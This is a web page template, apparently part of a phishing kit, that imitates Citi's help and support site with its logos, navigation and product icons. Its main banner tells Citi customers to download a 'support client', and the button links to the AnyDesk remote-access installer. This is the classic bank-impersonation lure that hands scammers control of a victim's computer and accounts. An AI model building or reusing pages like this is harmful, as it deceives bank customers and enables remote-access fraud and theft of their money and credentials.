<x-layouts.app class="flex flex-col pr-6 pl-2 pb-2">

    <header class="h-22 px-10 flex items-center justify-between">
        <div class="flex items-center gap-x-6">
            <img src="{{ Vite::asset('resources/images/citiredesign.svg') }}" class="size-22" alt="Citi" />
            <img
                src="{{ Vite::asset('resources/images/Citi_Icon_Sprite_Banner_v2.svg') }}"
                class="mt-1"
                style="height: 32px; width: 427px; object-position: -20px -173px; object-fit: none;"
                alt="Citi"
            />
        </div>

        <div class="flex items-center">
            <div class="flex flex-col items-center" style="padding: 7px 4px; margin: 15px 8px 7px;">
                <img
                    src="{{ Vite::asset('resources/images/Citi_Icon_Sprite_Banner_v2.svg') }}"
                    style="object-fit: none; object-position: -167px -21px; height: 30px; width: 28px;"
                    alt=""
                />
                <span class="pt-2 text-xs text-[11px] color-[#666666] text-center font-light">ATM / BRANCH</span>
            </div>

            <div class="flex flex-col items-center" style="padding: 7px 4px; margin: 15px 8px 7px;">
                <img
                    src="{{ Vite::asset('resources/images/Citi_Icon_Sprite_Banner_v2.svg') }}"
                    style="object-fit: none; object-position: -247px -21px; height: 30px; width: 28px;"
                    alt=""
                />
                <span class="pt-2 text-xs text-[11px] color-[#666666] text-center font-light">ESPAÑOL</span>
            </div>
        </div>
    </header>

    <div
        class="h-12 bg-[#F0F5F7] pl-8 pr-10 flex items-center justify-between"
        style="box-shadow: rgba(0, 0, 0, 0.12) 0px 1px 10px 0px;"
    >
        <div class="flex items-center">
            <a href="#" class="text-link h-11 inline-flex items-center px-5 rounded-t-lg hover:text-white hover:bg-[#5E676B]">Credit Cards</a>
            <a href="#" class="text-link h-11 inline-flex items-center px-5 rounded-t-lg hover:text-white hover:bg-[#5E676B]">Banking</a>
            <a href="#" class="text-link h-11 inline-flex items-center px-5 rounded-t-lg hover:text-white hover:bg-[#5E676B]">Lending</a>
            <a href="#" class="text-link h-11 inline-flex items-center px-5 rounded-t-lg hover:text-white hover:bg-[#5E676B]">Investing</a>
            <a href="#" class="text-link h-11 inline-flex items-center px-5 rounded-t-lg hover:text-white hover:bg-[#5E676B]">Wealth Management</a>
            <a href="#" class="text-link h-11 inline-flex items-center px-5 pr-9 rounded-t-lg hover:text-white hover:bg-[#5E676B] group relative">
                <span>Open an Account</span>
                <span
                    class="absolute bg-no-repeat block size-5 top-[calc(50%+0.125rem+1.5px)] left-39 -translate-y-1/2 group-hover:brightness-0 group-hover:invert"
                    style="background-position: -105px -89px; background-image: url('{{ Vite::asset('resources/images/Citi_Icon_Sprite_Nav_v2.svg') }}');"
                ></span>
            </a>
        </div>

        <div class="flex items-center">
            <a href="#" class="text-link h-11 inline-flex items-center px-5 rounded-t-lg hover:text-white hover:bg-[#5E676B]">Register</a>
        </div>
    </div>


    <div
        class="bg-[#FAFAFA] bg-center bg-cover relative w-full border-b border-[#F1F1F1] lg:min-h-89 xl:max-w-500 mx-auto"
        style="background-image: url('{{ Vite::asset('resources/images/Citi-futuristic-angles-bg-compressed.jpg') }}')"
    >
        <div class="mx-8 px-3 grid grid-cols-12">
            <div class="mt-10 px-2.5 flex flex-col justify-center col-span-4">
                <p class="text-[#333333] font-light tracking-wider">
                    CITI<sup>&reg;</sup> HELP & SUPPORT CENTER
                </p>
                <h1 class="text-[#333333] font-bold text-[42px] leading-[50px] mb-3">
                    Get Your Citi Financial Assistance
                </h1>
                <p class="font-light text-[#333333] leading-6 mb-2.5">
                    Citi banking customers can get real-time support via downloading our support client tool.
                </p>

                <a
                    role="button"
                    href="https://anydesk.com/en/downloads/windows"
                    class="text-white bg-input cursor-pointer text-center max-w-max my-5 mr-2.5 py-3.25 px-12 rounded-lg hover:bg-button-focus focus:bg-button-focus"
                >
                    Download Support Client
                </a>
            </div>
            <div class="col-span-3"></div>
            <div class="col-span-5 mt-auto pt-5 px-2.5 text-center">
                <img
                    src="{{ Vite::asset('resources/images/citidotcom-H2_Mortage2.png') }}"
                    class="h-full w-full max-w-80 float-left align-middle"
                    alt="Citi Mortgage"
                />
            </div>
        </div>
    </div>

    <div class="mx-14 py-5 px-3 flex flex-col mb-10 border border-[gainsboro] rounded-2xl">
        <div class="flex items-center justify-around">
            <div class="text-sm text-center my-1.75 flex flex-col items-center text-input font-bold leading-5.25">
                <div style="background: url(&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iMjAiIGZpbGw9IiNFRkYzRjgiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xOS43NSAxOS4xNjY1SDIyLjc1QzIzLjUzIDE5LjE2NjUgMjQuMTY2NyAxOS44MDMyIDI0LjE2NjcgMjAuNTgzMlYyMS4wODMyQzI0LjE2NjcgMjEuODY0IDIzLjUzIDIyLjQ5OTggMjIuNzUgMjIuNDk5OEgxOS43NUMxOC45NyAyMi40OTk4IDE4LjMzMzMgMjEuODY0IDE4LjMzMzMgMjEuMDgzMlYyMC41ODMyQzE4LjMzMzMgMTkuODAzMiAxOC45NyAxOS4xNjY1IDE5Ljc1IDE5LjE2NjVaTTIyLjc1IDIxLjY2NjVDMjMuMDcwOCAyMS42NjY1IDIzLjMzMzMgMjEuNDAzMiAyMy4zMzMzIDIxLjA4MzJWMjAuNTgzMkMyMy4zMzMzIDIwLjI2MzIgMjMuMDcwOCAxOS45OTk4IDIyLjc1IDE5Ljk5OThIMTkuNzVDMTkuNDMgMTkuOTk5OCAxOS4xNjY3IDIwLjI2NCAxOS4xNjY3IDIwLjU4MzJWMjEuMDgzMkMxOS4xNjY3IDIxLjQwMzIgMTkuNDMgMjEuNjY2NSAxOS43NSAyMS42NjY1SDIyLjc1WiIgZmlsbD0iIzA1NkRBRSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTI4LjMzMzMgMTUuODMzM0gyOC43OTE3QzI5LjQ2MTcgMTUuODMzMyAzMCAxNi4zOTkyIDMwIDE3LjA4MzNWMjcuMDgzM0MzMCAyNy43NjY3IDI5LjQ2MTcgMjguMzMzMyAyOC43OTE3IDI4LjMzMzNIMTQuNTQxN0MxMy44NzE3IDI4LjMzMzMgMTMuMzMzMyAyNy43NjY3IDEzLjMzMzMgMjcuMDgzM1YyNi42NjY3SDEyLjg3NUMxMi4yMDUgMjYuNjY2NyAxMS42NjY3IDI2LjEgMTEuNjY2NyAyNS40MTY3VjI1SDExLjIwODNDMTAuNTM4MyAyNSAxMCAyNC40MzMzIDEwIDIzLjc1VjEzLjc1QzEwIDEzLjA2NjcgMTAuNTM4MyAxMi41IDExLjIwODMgMTIuNUgyNS40NTgzQzI2LjEyODMgMTIuNSAyNi42NjY3IDEzLjA2NTggMjYuNjY2NyAxMy43NVYxNC4xNjY3SDI3LjEyNUMyNy43OTUgMTQuMTY2NyAyOC4zMzMzIDE0LjczMjUgMjguMzMzMyAxNS40MTY3VjE1LjgzMzNaTTI4Ljc5MTcgMjcuNUMyOC45OTI1IDI3LjUgMjkuMTY2NyAyNy4zMTU4IDI5LjE2NjcgMjcuMDgzM1YxNy4wODMzQzI5LjE2NjcgMTYuODUgMjguOTkyNSAxNi42NjY3IDI4Ljc5MTcgMTYuNjY2N0gyOC4zMzMzVjI1LjQxNjdDMjguMzMzMyAyNi4xIDI3Ljc5NSAyNi42NjY3IDI3LjEyNSAyNi42NjY3SDE0LjE2NjdWMjcuMDgzM0MxNC4xNjY3IDI3LjMxNTggMTQuMzQwOCAyNy41IDE0LjU0MTcgMjcuNUgyOC43OTE3Wk0xMi41IDI1LjQxNjdWMjVIMjUuNDU4M0MyNi4xMjgzIDI1IDI2LjY2NjcgMjQuNDMzMyAyNi42NjY3IDIzLjc1VjE1SDI3LjEyNUMyNy4zMjU4IDE1IDI3LjUgMTUuMTgzMyAyNy41IDE1LjQxNjdWMjUuNDE2N0MyNy41IDI1LjY0OTIgMjcuMzI1OCAyNS44MzMzIDI3LjEyNSAyNS44MzMzSDEzLjc5NUMxMy43ODggMjUuODMyNiAxMy43ODE1IDI1LjgzMDcgMTMuNzc1IDI1LjgyODhDMTMuNzY2OSAyNS44MjY1IDEzLjc1ODggMjUuODI0MiAxMy43NSAyNS44MjQyQzEzLjc0MTIgMjUuODI0MiAxMy43MzMyIDI1LjgyNjUgMTMuNzI1IDI1LjgyODhDMTMuNzE4NiAyNS44MzA3IDEzLjcxMiAyNS44MzI2IDEzLjcwNSAyNS44MzMzSDEyLjg3NUMxMi42NzQyIDI1LjgzMzMgMTIuNSAyNS42NDkyIDEyLjUgMjUuNDE2N1pNMTAuODMzMyAxNS44MzMzVjIzLjc1QzEwLjgzMzMgMjMuOTgyNSAxMS4wMDc1IDI0LjE2NjcgMTEuMjA4MyAyNC4xNjY3SDI1LjQ1ODNDMjUuNjU5MiAyNC4xNjY3IDI1LjgzMzMgMjMuOTgyNSAyNS44MzMzIDIzLjc1VjE1LjgzMzNIMTAuODMzM1pNMTEuMjA4MyAxMy4zMzMzSDI1LjQ1ODNDMjUuNjU5MiAxMy4zMzMzIDI1LjgzMzMgMTMuNTE2NyAyNS44MzMzIDEzLjc1VjE1SDEwLjgzMzNWMTMuNzVDMTAuODMzMyAxMy41MTc1IDExLjAwNzUgMTMuMzMzMyAxMS4yMDgzIDEzLjMzMzNaIiBmaWxsPSIjMDU2REFFIi8+Cjwvc3ZnPgo=&quot;); height: 40px; margin-bottom: 10px; width: 40px;"></div>
                <span>Credit Cards</span>
            </div>

            <div class="text-sm text-center my-1.75 flex flex-col items-center text-input font-bold leading-5.25">
                <div style="background: url(&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDEiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MSA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMC43OTk5ODgiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgcng9IjIwIiBmaWxsPSIjRUZGM0Y4Ii8+CjxwYXRoIGQ9Ik0xMy4yOTk3IDIyLjA4MzNDMTMuMjk5NyAyMi4zMTMzIDEzLjQ1OTcgMjIuNSAxMy42NTcyIDIyLjVIMjIuOTQzMUMyMy4xNDA2IDIyLjUgMjMuMjk5NyAyMi4zMTMzIDIzLjI5OTcgMjIuMDgzM0MyMy4yOTk3IDIxLjg1MzMgMjMuMTQwNiAyMS42NjY3IDIyLjk0MzEgMjEuNjY2N0gxMy42NTcyQzEzLjQ1OTcgMjEuNjY2NyAxMy4yOTk3IDIxLjg1MzMgMTMuMjk5NyAyMi4wODMzWiIgZmlsbD0iIzA1NkRBRSIvPgo8cGF0aCBkPSJNMTMuNjcwMiAxOS4xNjY3QzEzLjQ2NjEgMTkuMTY2NyAxMy4zMDAyIDE4Ljk4IDEzLjMwMDIgMTguNzVDMTMuMzAwMiAxOC41MiAxMy40NjYxIDE4LjMzMzMgMTMuNjcwMiAxOC4zMzMzSDE5LjU5NjFDMTkuODAwMiAxOC4zMzMzIDE5Ljk2NjkgMTguNTIgMTkuOTY2OSAxOC43NUMxOS45NjY5IDE4Ljk4IDE5LjgwMDIgMTkuMTY2NyAxOS41OTYxIDE5LjE2NjdIMTMuNjcwMloiIGZpbGw9IiMwNTZEQUUiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yNC45NjY3IDE3LjVIMjYuNjMzM0MyNy41NTMzIDE3LjUgMjguMyAxOC4yNDY3IDI4LjMgMTkuMTY2N0MyOC4zIDIwLjA4NjcgMjcuNTUzMyAyMC44MzMzIDI2LjYzMzMgMjAuODMzM0gyNC45NjY3QzI0LjA0NjcgMjAuODMzMyAyMy4zIDIwLjA4NjcgMjMuMyAxOS4xNjY3QzIzLjMgMTguMjQ2NyAyNC4wNDY3IDE3LjUgMjQuOTY2NyAxNy41Wk0yNC45NjY3IDIwSDI2LjYzMzNDMjcuMDk0MiAyMCAyNy40NjY3IDE5LjYyNjcgMjcuNDY2NyAxOS4xNjY3QzI3LjQ2NjcgMTguNzA2NyAyNy4wOTQyIDE4LjMzMzMgMjYuNjMzMyAxOC4zMzMzSDI0Ljk2NjdDMjQuNTA1OCAxOC4zMzMzIDI0LjEzMzMgMTguNzA2NyAyNC4xMzMzIDE5LjE2NjdDMjQuMTMzMyAxOS42MjY3IDI0LjUwNTggMjAgMjQuOTY2NyAyMFoiIGZpbGw9IiMwNTZEQUUiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0zMC4wMzA4IDE0LjE2NjdIMTEuNTY5MkMxMS4xNDQyIDE0LjE2NjcgMTAuOCAxNC41Njg3IDEwLjggMTUuMDY0MVYyNC45MzU5QzEwLjggMjUuNDMyMiAxMS4xNDQyIDI1LjgzMzMgMTEuNTY5MiAyNS44MzMzSDMwLjAzMDhDMzAuNDU1OCAyNS44MzMzIDMwLjggMjUuNDMyMiAzMC44IDI0LjkzNTlWMTUuMDY0MUMzMC44IDE0LjU2ODcgMzAuNDU1OCAxNC4xNjY3IDMwLjAzMDggMTQuMTY2N1pNMTEuNjMzMyAyNUgyOS45NjY3VjE1SDExLjYzMzNWMjVaIiBmaWxsPSIjMDU2REFFIi8+Cjwvc3ZnPgo=&quot;); height: 40px; margin-bottom: 10px; width: 40px;"></div>
                <span>Checking Accounts</span>
            </div>

            <div class="text-sm text-center my-1.75 flex flex-col items-center text-input font-bold leading-5.25">
                <div style="background: url(&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDEiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MSA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMC42MDAwMDYiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgcng9IjIwIiBmaWxsPSIjRUZGM0Y4Ii8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMjcuNTU2NyAxNS4xMTA3VjI4LjMxNDhIMjMuMjA4OVYyMi43NzhDMjMuMjA4OSAyMi41NDI5IDIzLjAxNDEgMjIuMzUyMSAyMi43NzQxIDIyLjM1MjFIMTguNDI2M0MxOC4xODYzIDIyLjM1MjEgMTcuOTkxNSAyMi41NDI5IDE3Ljk5MTUgMjIuNzc4VjI4LjMxNDhIMTMuNjQzN1YxNS4xMTA3QzEzLjY0MzcgMTUuMTAxNCAxMy42Mzg1IDE1LjA5MjggMTMuNjM4NSAxNS4wODM1TDIwLjYwMDIgMTAuOTI0OUwyNy41NjI4IDE1LjA4MzVDMjcuNTYxOSAxNS4wOTI4IDI3LjU1NjcgMTUuMTAxNCAyNy41NTY3IDE1LjExMDdNMzAuMzkyMyAxNS43NzY5TDIwLjgyNjMgMTAuMDYyQzIwLjY4OCA5Ljk3OTM0IDIwLjUxMjQgOS45NzkzNCAyMC4zNzQxIDEwLjA2MkwxMC44MDg5IDE1Ljc3NjlDMTAuNjAzNyAxNS44OTg3IDEwLjUzODUgMTYuMTYxIDEwLjY2MzcgMTYuMzYyMUMxMC43ODg5IDE2LjU2MzEgMTEuMDU1OSAxNi42MjYxIDExLjI2MTEgMTYuNTAzNUwxMi43NzQxIDE1LjYwMDVWMjguNzQwOEMxMi43NzQxIDI4Ljk3NTkgMTIuOTY4OSAyOS4xNjY3IDEzLjIwODkgMjkuMTY2N0gxOC40MjYzQzE4LjY2NjMgMjkuMTY2NyAxOC44NjExIDI4Ljk3NTkgMTguODYxMSAyOC43NDA4VjIzLjIwMzlIMjIuMzM5M1YyOC43NDA4QzIyLjMzOTMgMjguOTc1OSAyMi41MzQxIDI5LjE2NjcgMjIuNzc0MSAyOS4xNjY3SDI3Ljk5MTVDMjguMjMxNSAyOS4xNjY3IDI4LjQyNjMgMjguOTc1OSAyOC40MjYzIDI4Ljc0MDhWMTUuNjAwNUwyOS45Mzg0IDE2LjUwMzVDMzAuMTQ0NSAxNi42MjYxIDMwLjQxMTUgMTYuNTYzMSAzMC41MzY3IDE2LjM2MjFDMzAuNjYxIDE2LjE2MSAzMC41OTY3IDE1Ljg5ODcgMzAuMzkyMyAxNS43NzY5IiBmaWxsPSIjMDU2REFFIi8+Cjwvc3ZnPgo=&quot;); height: 40px; margin-bottom: 10px; width: 40px;"></div>
                <span>Mortgage</span>
            </div>

            <div class="text-sm text-center my-1.75 flex flex-col items-center text-input font-bold leading-5.25">
                <div style="background: url(&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDEiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MSA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMC40MDAwMjQiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgcng9IjIwIiBmaWxsPSIjRUZGM0Y4Ii8+CjxwYXRoIGQ9Ik0xNC41MTY3IDEzLjExMDlDMTYuMTY1IDExLjY2NTcgMTguMjI3NSAxMC44NzAxIDIwLjQgMTAuODcwMUMyNS40NTQyIDEwLjg3MDEgMjkuNTY2NyAxNS4xNjEzIDI5LjU2NjcgMjAuNDM1MUMyOS41NjY3IDI1LjcwODggMjUuNDU0MiAzMCAyMC40IDMwQzE1LjM0NTkgMzAgMTEuMjMzNCAyNS43MDg4IDExLjIzMzQgMjAuNDM1MUMxMS4yMzM0IDE4Ljk1NzcgMTEuNTQ3NSAxNy41NDA0IDEyLjE2NzUgMTYuMjIzOUwxMi4yNzU5IDE1Ljk5OTVDMTIuMzgxNyAxNS43ODY1IDEyLjYzMzQgMTUuNzAzIDEyLjgzODQgMTUuODE1MkMxMy4wNDI1IDE1LjkyNTYgMTMuMTIxNyAxNi4xODkxIDEzLjAxNSAxNi40MDEzTDEyLjkxNTkgMTYuNjA2NUMxMi4zNTI1IDE3LjgwMzggMTIuMDY2NyAxOS4wOTE2IDEyLjA2NjcgMjAuNDM1MUMxMi4wNjY3IDI1LjIyOTcgMTUuODA1IDI5LjEzMDUgMjAuNCAyOS4xMzA1QzI0Ljk5NSAyOS4xMzA1IDI4LjczMzQgMjUuMjI5NyAyOC43MzM0IDIwLjQzNTFDMjguNzMzNCAxNS42NDA0IDI0Ljk5NSAxMS43Mzk3IDIwLjQgMTEuNzM5N0MxOC40MTc1IDExLjczOTcgMTYuNTM2NyAxMi40NjkyIDE1LjAzNTkgMTMuNzkxOEMxNS4wNDA0IDEzLjc5MTMgMTUuMDQ0NiAxMy43OTIgMTUuMDQ4OCAxMy43OTI2QzE1LjA1MjkgMTMuNzkzMyAxNS4wNTcxIDEzLjc5MzkgMTUuMDYxNyAxMy43OTM1TDE3LjYyNTkgMTMuNTMxOEMxNy44NiAxMy41MDc0IDE4LjA1ODQgMTMuNjgzMSAxOC4wODE3IDEzLjkyMTNDMTguMTA0MiAxNC4xNjA1IDE3LjkzNjcgMTQuMzczNSAxNy43MDc1IDE0LjM5N0wxNS4xNDM0IDE0LjY1ODdDMTUuMDg5MiAxNC42NjQ4IDE1LjAzNTkgMTQuNjY3NCAxNC45ODM0IDE0LjY2NzRDMTQuNTg3NSAxNC42Njc0IDE0LjIzIDE0LjUxMzUgMTMuOTg1OSAxNC4yMzI2QzEzLjcwOTIgMTMuOTE0NCAxMy42MDE3IDEzLjQ2MTMgMTMuNjkgMTIuOTkwMUwxNC4xODU5IDEwLjM1MTlDMTQuMjMgMTAuMTE2MiAxNC40NDkyIDkuOTYxNDQgMTQuNjc1IDEwLjAwODRDMTQuOTAwOSAxMC4wNTU0IDE1LjA0ODQgMTAuMjgzMiAxNS4wMDQyIDEwLjUxODhMMTQuNTE2NyAxMy4xMTA5WiIgZmlsbD0iIzA1NkRBRSIvPgo8cGF0aCBkPSJNMTguMDY0NCAyMy41NTkzQzE4LjcxMzUgMjQuMTAxIDE5LjUzMzUgMjQuMzQ3MSAyMC4yODc3IDI0LjM0NzFDMjEuMDUxIDI0LjM0NzEgMjEuNDkyNyAyNC4yMTE1IDIyLjAxMTkgMjMuNzAxQzIyLjI4MTkgMjMuNDM1IDIyLjM4NzcgMjMuMTQyOCAyMi4zODc3IDIyLjY1NDFDMjIuMzg3NyAyMS45NDcyIDIyLjA4OTQgMjEuNDk5NCAyMS40MzQ0IDIxLjIzMTZDMTkuODgxIDIwLjU3MzMgMTkuMDMxIDIwLjIwOSAxOC44NTc3IDIwLjEyNzJDMTguMDk5NCAxOS43Njk5IDE3LjQzNiAxOS4wNzYgMTcuNDM2IDE4LjA2NjRDMTcuNDM2IDE2LjU2NDcgMTguMzUyNyAxNS43NjM5IDE5Ljg4NzcgMTUuNjdWMTQuNzgyMkMxOS44ODc3IDE0LjU0MjIgMjAuMDc0NCAxNC4zNDc0IDIwLjMwNDQgMTQuMzQ3NEMyMC41MzQ0IDE0LjM0NzQgMjAuNzIxIDE0LjU0MjIgMjAuNzIxIDE0Ljc4MjJWMTUuNjg0OEMyMS41MDc3IDE1Ljc1NjkgMjIuMTU2OSAxNS45ODQ3IDIyLjY0MjcgMTYuMzk2QzIyLjgyMSAxNi41NDczIDIyLjg0NzcgMTYuODIwNCAyMi43MDI3IDE3LjAwODJDMjIuNTU4NSAxNy4xOTQzIDIyLjI5NjkgMTcuMjIyMSAyMi4xMTY5IDE3LjA3MTdDMjEuNjkwMiAxNi43MDk5IDIxLjA1MSAxNi41MjEzIDIwLjE4NjkgMTYuNTIxM0MxOC44ODQ0IDE2LjUyMTMgMTguMjY5NCAxNy4wMDkxIDE4LjI2OTQgMTguMDY2NEMxOC4yNjk0IDE4LjY0MjkgMTguNzA3NyAxOS4xMDI5IDE5LjIwMSAxOS4zMzUxQzE5LjM1ODUgMTkuNDA5OSAyMC4yMTc3IDE5Ljc3NjggMjEuNzQyNyAyMC40MjM4QzIyLjcwOTQgMjAuODE4NSAyMy4yMjEgMjEuNTg2MyAyMy4yMjEgMjIuNjU0MUMyMy4yMjEgMjMuMzY5OCAyMy4wMzEgMjMuODkyMyAyMi41ODQ0IDI0LjMzMjNDMjIuMDAxIDI0LjkwOCAyMS40NDQ0IDI1LjEyODggMjAuNzIxIDI1LjE5MDZWMjYuMTEzMkMyMC43MjEgMjYuMzU0IDIwLjUzNDQgMjYuNTQ3OSAyMC4zMDQ0IDI2LjU0NzlDMjAuMDc0NCAyNi41NDc5IDE5Ljg4NzcgMjYuMzU0IDE5Ljg4NzcgMjYuMTEzMlYyNS4xODU0QzE5LjA3NiAyNS4xMTA2IDE4LjI0MSAyNC44MTkzIDE3LjU0NDQgMjQuMjM5M0MxNy4zNjQ0IDI0LjA4ODkgMTcuMzM1MiAyMy44MTU4IDE3LjQ3ODUgMjMuNjI4OUMxNy42MjE5IDIzLjQ0MDIgMTcuODg0NCAyMy40MTA2IDE4LjA2NDQgMjMuNTU5M1oiIGZpbGw9IiMwNTZEQUUiLz4KPC9zdmc+Cg==&quot;); height: 40px; margin-bottom: 10px; width: 40px;"></div>
                <span>Personal Loans</span>
            </div>

            <div class="text-sm text-center my-1.75 flex flex-col items-center text-input font-bold leading-5.25">
                <div style="background: url(&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDEiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MSA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMC40MDAwMjQiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgcng9IjIwIiBmaWxsPSIjRUZGM0Y4Ii8+CjxwYXRoIGQ9Ik0xNC41MTY3IDEzLjExMDlDMTYuMTY1IDExLjY2NTcgMTguMjI3NSAxMC44NzAxIDIwLjQgMTAuODcwMUMyNS40NTQyIDEwLjg3MDEgMjkuNTY2NyAxNS4xNjEzIDI5LjU2NjcgMjAuNDM1MUMyOS41NjY3IDI1LjcwODggMjUuNDU0MiAzMCAyMC40IDMwQzE1LjM0NTkgMzAgMTEuMjMzNCAyNS43MDg4IDExLjIzMzQgMjAuNDM1MUMxMS4yMzM0IDE4Ljk1NzcgMTEuNTQ3NSAxNy41NDA0IDEyLjE2NzUgMTYuMjIzOUwxMi4yNzU5IDE1Ljk5OTVDMTIuMzgxNyAxNS43ODY1IDEyLjYzMzQgMTUuNzAzIDEyLjgzODQgMTUuODE1MkMxMy4wNDI1IDE1LjkyNTYgMTMuMTIxNyAxNi4xODkxIDEzLjAxNSAxNi40MDEzTDEyLjkxNTkgMTYuNjA2NUMxMi4zNTI1IDE3LjgwMzggMTIuMDY2NyAxOS4wOTE2IDEyLjA2NjcgMjAuNDM1MUMxMi4wNjY3IDI1LjIyOTcgMTUuODA1IDI5LjEzMDUgMjAuNCAyOS4xMzA1QzI0Ljk5NSAyOS4xMzA1IDI4LjczMzQgMjUuMjI5NyAyOC43MzM0IDIwLjQzNTFDMjguNzMzNCAxNS42NDA0IDI0Ljk5NSAxMS43Mzk3IDIwLjQgMTEuNzM5N0MxOC40MTc1IDExLjczOTcgMTYuNTM2NyAxMi40NjkyIDE1LjAzNTkgMTMuNzkxOEMxNS4wNDA0IDEzLjc5MTMgMTUuMDQ0NiAxMy43OTIgMTUuMDQ4OCAxMy43OTI2QzE1LjA1MjkgMTMuNzkzMyAxNS4wNTcxIDEzLjc5MzkgMTUuMDYxNyAxMy43OTM1TDE3LjYyNTkgMTMuNTMxOEMxNy44NiAxMy41MDc0IDE4LjA1ODQgMTMuNjgzMSAxOC4wODE3IDEzLjkyMTNDMTguMTA0MiAxNC4xNjA1IDE3LjkzNjcgMTQuMzczNSAxNy43MDc1IDE0LjM5N0wxNS4xNDM0IDE0LjY1ODdDMTUuMDg5MiAxNC42NjQ4IDE1LjAzNTkgMTQuNjY3NCAxNC45ODM0IDE0LjY2NzRDMTQuNTg3NSAxNC42Njc0IDE0LjIzIDE0LjUxMzUgMTMuOTg1OSAxNC4yMzI2QzEzLjcwOTIgMTMuOTE0NCAxMy42MDE3IDEzLjQ2MTMgMTMuNjkgMTIuOTkwMUwxNC4xODU5IDEwLjM1MTlDMTQuMjMgMTAuMTE2MiAxNC40NDkyIDkuOTYxNDQgMTQuNjc1IDEwLjAwODRDMTQuOTAwOSAxMC4wNTU0IDE1LjA0ODQgMTAuMjgzMiAxNS4wMDQyIDEwLjUxODhMMTQuNTE2NyAxMy4xMTA5WiIgZmlsbD0iIzA1NkRBRSIvPgo8cGF0aCBkPSJNMTguMDY0NCAyMy41NTkzQzE4LjcxMzUgMjQuMTAxIDE5LjUzMzUgMjQuMzQ3MSAyMC4yODc3IDI0LjM0NzFDMjEuMDUxIDI0LjM0NzEgMjEuNDkyNyAyNC4yMTE1IDIyLjAxMTkgMjMuNzAxQzIyLjI4MTkgMjMuNDM1IDIyLjM4NzcgMjMuMTQyOCAyMi4zODc3IDIyLjY1NDFDMjIuMzg3NyAyMS45NDcyIDIyLjA4OTQgMjEuNDk5NCAyMS40MzQ0IDIxLjIzMTZDMTkuODgxIDIwLjU3MzMgMTkuMDMxIDIwLjIwOSAxOC44NTc3IDIwLjEyNzJDMTguMDk5NCAxOS43Njk5IDE3LjQzNiAxOS4wNzYgMTcuNDM2IDE4LjA2NjRDMTcuNDM2IDE2LjU2NDcgMTguMzUyNyAxNS43NjM5IDE5Ljg4NzcgMTUuNjdWMTQuNzgyMkMxOS44ODc3IDE0LjU0MjIgMjAuMDc0NCAxNC4zNDc0IDIwLjMwNDQgMTQuMzQ3NEMyMC41MzQ0IDE0LjM0NzQgMjAuNzIxIDE0LjU0MjIgMjAuNzIxIDE0Ljc4MjJWMTUuNjg0OEMyMS41MDc3IDE1Ljc1NjkgMjIuMTU2OSAxNS45ODQ3IDIyLjY0MjcgMTYuMzk2QzIyLjgyMSAxNi41NDczIDIyLjg0NzcgMTYuODIwNCAyMi43MDI3IDE3LjAwODJDMjIuNTU4NSAxNy4xOTQzIDIyLjI5NjkgMTcuMjIyMSAyMi4xMTY5IDE3LjA3MTdDMjEuNjkwMiAxNi43MDk5IDIxLjA1MSAxNi41MjEzIDIwLjE4NjkgMTYuNTIxM0MxOC44ODQ0IDE2LjUyMTMgMTguMjY5NCAxNy4wMDkxIDE4LjI2OTQgMTguMDY2NEMxOC4yNjk0IDE4LjY0MjkgMTguNzA3NyAxOS4xMDI5IDE5LjIwMSAxOS4zMzUxQzE5LjM1ODUgMTkuNDA5OSAyMC4yMTc3IDE5Ljc3NjggMjEuNzQyNyAyMC40MjM4QzIyLjcwOTQgMjAuODE4NSAyMy4yMjEgMjEuNTg2MyAyMy4yMjEgMjIuNjU0MUMyMy4yMjEgMjMuMzY5OCAyMy4wMzEgMjMuODkyMyAyMi41ODQ0IDI0LjMzMjNDMjIuMDAxIDI0LjkwOCAyMS40NDQ0IDI1LjEyODggMjAuNzIxIDI1LjE5MDZWMjYuMTEzMkMyMC43MjEgMjYuMzU0IDIwLjUzNDQgMjYuNTQ3OSAyMC4zMDQ0IDI2LjU0NzlDMjAuMDc0NCAyNi41NDc5IDE5Ljg4NzcgMjYuMzU0IDE5Ljg4NzcgMjYuMTEzMlYyNS4xODU0QzE5LjA3NiAyNS4xMTA2IDE4LjI0MSAyNC44MTkzIDE3LjU0NDQgMj